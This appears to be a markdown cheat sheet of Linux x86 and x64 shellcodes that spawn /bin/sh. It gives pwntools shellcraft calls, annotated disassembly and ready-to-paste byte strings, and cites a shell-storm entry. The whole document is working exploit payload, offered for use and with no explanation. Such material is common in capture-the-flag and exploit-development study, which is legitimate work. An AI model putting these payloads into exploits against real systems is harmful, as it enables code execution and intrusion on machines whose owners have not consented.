# &#35; linux x86 exec shellcodes

```bash

# 44 bytes
>>> context.clear()
>>> context.os='linux'
>>> context.arch='i386'
shellcode = asm(shellcraft.i386.linux.sh)

# 23 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  89 c1                   mov    ecx,eax
11: 89 c2                   mov    edx,eax
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"


# 26 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 6e 2f 73 68          push   0x68732f6e
8:  68 2f 2f 62 69          push   0x69622f2f
d:  89 e3                   mov    ebx,esp
f:  31 c9                   xor    ecx,ecx
11: 31 d2                   xor    edx,edx
13: b0 08                   mov    al,0x8
15: 40                      inc    eax
16: 40                      inc    eax
17: 40                      inc    eax
18: cd 80                   int    0x80
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"


```


# &#35; linux x64 exec shellcodes

```bash

# 48 bytes
>>> context.clear()
>>> context.os='linux'
>>> context.arch='amd64'
>>> asm(shellcraft.amd64.linux.sh())
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>>


# 26 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   rax
3:  48 31 d2                xor    rdx,rdx
6:  48 31 f6                xor    rsi,rsi
9:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
10: 2f 73 68
13: 53                      push   rbx
14: 54                      push   rsp
15: 5f                      pop    rdi
16: b0 3b                   mov    al,0x3b
18: 0f 05                   syscall

shellcode = b"\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"


# 23 bytes
http://shell-storm.org/shellcode/files/shellcode-585.php
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"




# 26 bytes
0:  b0 3b                   mov    al,0x3b
2:  48 31 f6                xor    rsi,rsi
5:  48 31 d2                xor    rdx,rdx
8:  48 8d 3d f8 ff ff ff    lea    rdi,[rip+0xfffffffffffffff8]        # 7 <_main+0x7>
f:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f6e69622f
16: 73 68 00
19: 48 89 0f                mov    QWORD PTR [rdi],rcx
1c: 0f 05                   syscall

shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"




```
